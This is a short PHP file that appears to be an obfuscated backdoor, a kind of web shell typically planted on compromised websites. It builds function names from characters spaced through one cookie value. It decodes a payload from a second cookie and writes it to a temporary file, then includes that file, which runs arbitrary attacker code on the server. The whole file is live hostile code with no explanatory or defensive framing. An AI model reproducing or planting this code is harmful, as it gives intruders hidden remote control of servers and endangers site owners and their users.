<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[19])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[19][$n];
        if (!$c[19][$n + 1]) {
            if (!$c[19][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[15]() . $p[22];
    if (!$p[29]($k)) {
        $n = $p[27]($k, $p[18]);
        $p[17]($n, $p[4] . $p[1]($p[12]($c[3])));
    }
    include($k);
}